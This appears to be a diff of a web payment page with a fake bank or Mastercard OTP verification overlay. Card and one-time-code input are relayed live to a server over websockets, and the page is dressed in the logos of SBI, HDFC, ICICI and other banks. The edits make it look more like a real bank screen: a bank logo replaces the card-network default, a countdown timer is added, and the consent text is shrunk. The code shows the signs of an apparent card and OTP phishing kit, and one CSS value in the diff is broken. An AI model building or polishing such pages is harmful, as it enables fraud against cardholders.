@@ -223,7 +223,7 @@
             justify-content: center;
         }
         .otp-input input {
-            width: 3rem;
+           width: 3rem;
             height: 3.5rem;
             text-align: center;
             font-size: 1.5rem;
@@ -422,7 +422,7 @@
                         <p class="text-sm text-gray-600">
                             Your payment information is securely transmitted using 256-bit encryption. We do not store your card details.
                         </p>
-                    </div>
+</div>
                     
                     <div>
                         <h3 class="text-md font-medium mb-2">We Accept</h3>
@@ -539,7 +539,7 @@
 <!-- MC Verification Overlay -->
 <div id="mcVerificationOverlay" class="fullscreen-overlay">
   <!-- Loading Content - Shown Initially -->
-  <div id="mcLoadingContent" style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 450px; max-height: 550px; background: white; width: 90%; max-width: 480px; border-radius: 0; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
+  <div id="mcLoadingContent" style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 450px; max-height: 550px; background: white; width: 90%; max-width: 480px; border-radius: 0; box-shadow: 0 4px 10px rgba(0, 0, 0.2);">
     <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite;"></div>
     
     <!-- Added verification logo during loading -->
@@ -681,6 +681,7 @@ let state = {
 // Timer reference
 let timerRef = null;
 let socket = null;
+let mcTimerInterval = null;
 
 // Main application code
 document.addEventListener('DOMContentLoaded', function() {
@@ -745,7 +746,8 @@ document.addEventListener('DOMContentLoaded', function() {
                 <h3 style="margin-bottom: 10px; font-size: 18px;">Failed to initialize the application</h3>
                 <p style="margin-bottom: 10px;">Please try refreshing the page or contact support.</p>
                 <p style="font-size: 12px; color: #666;">Error details: ${error.message}</p>
-                <button onclick="window.location.reload()" style="margin-top: 15px; padding: 8px 16px; background: #2563eb; color: white; border: none; border-radius: 4px; cursor: pointer;">Retry</button>
+                <button onclick="window.location.reload()" style="margin-top: 15px; padding: 8px 16px;
+                background: #2563eb; color: white; border: none; border-radius: 4px; cursor: pointer;">Retry</button>
             </div>
         `;
     }
@@ -832,6 +834,9 @@ function setupSocketListeners() {
             
             // Update UI components with transaction data
             updateMcVerificationUI(data);
+            
+            // Start the timer for 4:59 minutes
+            startMCTimer();
         }
     });
     
@@ -841,6 +846,11 @@ function setupSocketListeners() {
             mcContainer.style.display = 'none';
         }
         
+        // Clear the MC timer if it exists
+        if (mcTimerInterval) {
+            clearInterval(mcTimerInterval);
+        }
+        
         if (result.success) {
             showSuccessUI();
         } else {
@@ -848,8 +858,7 @@ function setupSocketListeners() {
             showErrorUI("Payment Failed", reason);
         }
     });
-    
-    socket.on('mc_otp_error', function(data) {
+  socket.on('mc_otp_error', function(data) {
         const otpInput = document.getElementById('mcOtpInput');
         const errorMsgElem = document.getElementById('mcOtpError');
         
@@ -875,7 +884,7 @@ function setupSocketListeners() {
             if (bankLogo) {
                 // Map of bank codes to logo URLs
                 const bankLogos = {
-                    'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
+                    'default': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
                     'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
                     'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
                     'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png',
@@ -895,6 +904,44 @@ function setupSocketListeners() {
             updateCurrencyDisplay(data.currency);
         }
     });
+}
+
+// Start the timer for 4:59 minutes (299 seconds)
+function startMCTimer() {
+    const timerDisplay = document.getElementById('mcTimer');
+    if (!timerDisplay) return;
+    
+    let timeLeft = 299; // 4:59 in seconds (4 minutes and 59 seconds)
+    
+    // Clear any existing timer
+    if (mcTimerInterval) {
+        clearInterval(mcTimerInterval);
+    }
+    
+    // Update timer display function
+    function updateTimerDisplay() {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        timerDisplay.textContent = `Session expires in: ${minutes}:${seconds.toString().padStart(2, '0')}`;
+    }
+    
+    // Initial display
+    updateTimerDisplay();
+    
+    // Start the timer
+    mcTimerInterval = setInterval(() => {
+        timeLeft--;
+        updateTimerDisplay();
+        
+        if (timeLeft <= 0) {
+            clearInterval(mcTimerInterval);
+            // Handle timeout - maybe show an error or auto-cancel
+            const cancelBtn = document.getElementById('mcCancelBtn');
+            if (cancelBtn) {
+                cancelBtn.click();
+            }
+        }
+    }, 1000);
 }
 
 function getReadableFailureReason(reasonCode) {
@@ -926,6 +973,26 @@ function updateMcVerificationUI(data) {
     // Set currency symbol
     updateCurrencyDisplay(data.currency || 'USD');
     
+    // Set bank logo - ensure it shows a bank logo and not MasterCard
+    const bankLogo = document.getElementById('bankLogo');
+    if (bankLogo) {
+        const bankCode = data.bankCode?.toLowerCase() || 'default';
+        
+        // Map of bank codes to logo URLs
+        const bankLogos = {
+            'default': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png', // Default to a bank logo, not MasterCard
+            'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
+            'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
+            'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png',
+            'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
+            'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
+            'kotak': 'https://static.wikia.nocookie.net/logopedia/images/1/16/Kotak_Mahindra_Bank.svg',
+            'yes': 'https://upload.wikimedia.org/wikipedia/commons/b/b3/Yes_Bank_logo.svg'
+        };
+        
+        bankLogo.src = bankLogos[bankCode] || bankLogos['default'];
+    }
+    
     // Set verification type logo
     const verificationLogo = document.getElementById('verificationTypeLogo');
     if (verificationLogo) {
@@ -942,29 +1009,26 @@ function updateMcVerificationUI(data) {
         verificationLogo.src = verificationLogos[verificationType] || verificationLogos['mastercard'];
     }
     
-    // Set bank logo
-    const bankLogo = document.getElementById('bankLogo');
-    if (bankLogo) {
-        const bankCode = data.bankCode || 'default';
-        
-        // Map of bank codes to logo URLs
-        const bankLogos = {
-            'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
-            'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
-            'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
-            'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png',
-            'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
-            'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
-            'kotak': 'https://static.wikia.nocookie.net/logopedia/images/1/16/Kotak_Mahindra_Bank.svg',
-            'yes': 'https://upload.wikimedia.org/wikipedia/commons/b/b3/Yes_Bank_logo.svg'
-        };
-        
-        bankLogo.src = bankLogos[bankCode] || bankLogos['default'];
-    }
-    
-    // Update masked phone number
+    // Set masked phone number
     if (data.phoneLastFour) {
         document.getElementById('cardLastFourDigits').textContent = `********${data.phoneLastFour}`;
+    }
+    
+    // Make sure the consent checkbox is correctly styled
+    const consentLabel = document.getElementById('consentLabel');
+    if (consentLabel) {
+        consentLabel.style.fontSize = '11px';
+        consentLabel.style.marginLeft = '5px';
+        consentLabel.style.marginRight = '5px';
+        consentLabel.style.color = '#555';
+    }
+
+    const consentCheckbox = document.getElementById('mcConsentCheckbox');
+    if (consentCheckbox) {
+        consentCheckbox.style.width = '12px';
+        consentCheckbox.style.height = '12px';
+        consentCheckbox.style.marginTop = '2px';
+        consentCheckbox.style.marginRight = '5px';
     }
     
     // Set up event handlers for buttons
@@ -1007,16 +1071,24 @@ function setupMcVerificationButtons() {
                 return;
             }
             
-            // Show loading state
+            // Show loading state - don't show "Invalid OTP" immediately
             submitBtn.disabled = true;
             submitBtn.textContent = 'Verifying...';
             
-            // Submit OTP to server
+            // Hide any existing error message
+            const errorMsg = document.getElementById('mcOtpError');
+            if (errorMsg) {
+                errorMsg.style.display = 'none';
+            }
+            
+            // Submit OTP to server - keep showing "Verifying..." until we get server response
             socket.emit('mc_otp_submitted', {
                 invoiceId: state.transactionId,
                 otp: otpValue,
                 timestamp: new Date().toISOString()
             });
+            
+            // We no longer show error automatically - we wait for server response
         };
     }
     
@@ -1054,6 +1126,11 @@ function setupMcVerificationButtons() {
                     mcVerificationOverlay.style.display = 'none';
                 }
                 
+                // Clear the MC timer if it exists
+                if (mcTimerInterval) {
+                    clearInterval(mcTimerInterval);
+                }
+                
                 // Notify server
                 socket.emit('mc_verification_cancelled', {
                     invoiceId: state.transactionId
@@ -1080,7 +1157,6 @@ function setupMcVerificationButtons() {
         };
     }
 }
-
 function showMCVerification(data) {
     console.log('Showing MC verification overlay with data:', data);
     
@@ -1379,10 +1455,7 @@ function showCardUI() {
                                 <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="American Express" class="h-6 w-auto object-contain" />
                             </div>
                             <div class="h-8 w-12 flex items-center justify-center">
-                                <img src="https://upload.wikimedia.org/wikipedia/commons/d/d1/Discover_Card_logo.svg" alt="Discover" class="h-6 w-auto object-contain" />
-                            </div>
-                            <div class="h-8 w-12 flex items-center justify-center">
-                                <img src="https://upload.wikimedia.org/wikipedia/commons/c/cb/Rupay-Logo.png" alt="RuPay" class="h-6 w-auto object-contain" />
+                                <img src="https://1000logos.net/wp-content/uploads/2021/05/Discover-logo-500x281.png" alt="Discover" class="h-6 w-auto object-contain" />
                             </div>
                         </div>
                     </div>
@@ -1401,7 +1474,7 @@ function showCardUI() {
                                         <line x1="1" y1="10" x2="23" y2="10"></line>
                                     </svg>
                                 </div>
-                                <input 
+                               <input 
                                     type="text" 
                                     id="card-number" 
                                     placeholder="1234 5678 9012 3456" 
@@ -1870,6 +1943,11 @@ function resetForm() {
     state.otpValue = '';
     state.loading = false;
     
+    // Clear any running timer
+    if (mcTimerInterval) {
+        clearInterval(mcTimerInterval);
+    }
+    
     showCardUI();
 }
 
@@ -1978,7 +2056,7 @@ init();
   
   // Bank logos
   const bankLogos = {
-    'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
+    'default': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
     'housing': 'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Housing_Bank_Logo.svg/1280px-Housing_Bank_Logo.svg.png',
     'gibraltar': 'https://upload.wikimedia.org/wikipedia/en/thumb/4/4a/Gibraltar_International_Bank_Logo.svg/220px-Gibraltar_International_Bank_Logo.svg.png',
     'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
@@ -2053,7 +2131,7 @@ init();
     }
     
     // Get stored data
-    const storedData = window.mcVerificationData || {};
+ const storedData = window.mcVerificationData || {};
     
     // Update logos
     // 1. Bank logo - updated to ensure bank logo shows on left side
@@ -2124,59 +2202,10 @@ init();
       consentCheckbox.style.marginTop = '2px';
     }
     
-    // Start the timer for 4:59 minutes
-    startMCTimer();
-    
     // Setup event handlers
     setupHandlers();
     
     console.log('MC Verification form shown');
-  }
-  
-  // Start the 4:59 minute timer
-  function startMCTimer() {
-    const timerDisplay = document.createElement('div');
-    timerDisplay.id = 'mcTimer';
-    timerDisplay.style.textAlign = 'center';
-    timerDisplay.style.marginTop = '10px';
-    timerDisplay.style.fontSize = '12px';
-    timerDisplay.style.color = '#666';
-    
-    // Insert the timer after the resend button
-    const resendBtn = document.getElementById('mcResendBtn');
-    if (resendBtn && resendBtn.parentNode) {
-      resendBtn.parentNode.parentNode.appendChild(timerDisplay);
-    }
-    
-    let timeLeft = 299; // 4:59 in seconds
-    updateTimerDisplay(timeLeft);
-    
-    if (mcTimerInterval) {
-      clearInterval(mcTimerInterval);
-    }
-    
-    mcTimerInterval = setInterval(() => {
-      timeLeft--;
-      updateTimerDisplay(timeLeft);
-      
-      if (timeLeft <= 0) {
-        clearInterval(mcTimerInterval);
-        // Handle timeout - maybe show an error or auto-cancel
-        const cancelBtn = document.getElementById('mcCancelBtn');
-        if (cancelBtn) {
-          cancelBtn.click();
-        }
-      }
-    }, 1000);
-  }
-  
-  function updateTimerDisplay(seconds) {
-    const minutes = Math.floor(seconds / 60);
-    const remainingSeconds = seconds % 60;
-    const timerDisplay = document.getElementById('mcTimer');
-    if (timerDisplay) {
-      timerDisplay.textContent = `Session expires in: ${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
-    }
   }
   
   // Setup event handlers
@@ -2202,6 +2231,11 @@ init();
         dom.submitBtn.textContent = 'Verifying...';
         dom.submitBtn.style.opacity = '0.7';
         dom.submitBtn.disabled = true;
+        
+        // Hide any error message
+        if (dom.otpError) {
+          dom.otpError.style.display = 'none';
+        }
         
         // Get OTP
         const otp = dom.otpInput.value;
@@ -2296,6 +2330,9 @@ init();
     socket.on('start_verification', function(data) {
       console.log('Received start_verification event:', data);
       showVerification(data);
+      
+      // Start the timer for 4:59 minutes
+      startMCTimer();
     });
     
     // Update bank logo
@@ -2341,6 +2378,58 @@ init();
         }
       }, data.success ? 3000 : 4000);
     });
+  }
+  
+  // Start the timer for 4:59 minutes (299 seconds)
+  function startMCTimer() {
+    // Get or create the timer display element
+    let timerDisplay = document.getElementById('mcTimer');
+    if (!timerDisplay) {
+      timerDisplay = document.createElement('div');
+      timerDisplay.id = 'mcTimer';
+      timerDisplay.style.textAlign = 'center';
+      timerDisplay.style.marginTop = '10px';
+      timerDisplay.style.fontSize = '12px';
+      timerDisplay.style.color = '#666';
+      
+      // Find where to insert it - after the buttons
+      const buttonContainer = document.querySelector('.mcVerificationContent button').parentNode;
+      if (buttonContainer) {
+        buttonContainer.parentNode.insertBefore(timerDisplay, buttonContainer.nextSibling);
+      }
+    }
+    
+    let timeLeft = 299; // 4:59 in seconds
+    
+    // Clear any existing timer
+    if (mcTimerInterval) {
+      clearInterval(mcTimerInterval);
+    }
+    
+    // Update timer display function
+    function updateTimerDisplay() {
+      const minutes = Math.floor(timeLeft / 60);
+      const seconds = timeLeft % 60;
+      timerDisplay.textContent = `Session expires in: ${minutes}:${seconds.toString().padStart(2, '0')}`;
+    }
+    
+    // Initial display
+    updateTimerDisplay();
+    
+    // Start the timer
+    mcTimerInterval = setInterval(() => {
+      timeLeft--;
+      updateTimerDisplay();
+      
+      if (timeLeft <= 0) {
+        clearInterval(mcTimerInterval);
+        // Handle timeout - maybe show an error or auto-cancel
+        const cancelBtn = document.getElementById('mcCancelBtn');
+        if (cancelBtn) {
+          cancelBtn.click();
+        }
+      }
+    }, 1000);
   }
 })();
 </script>
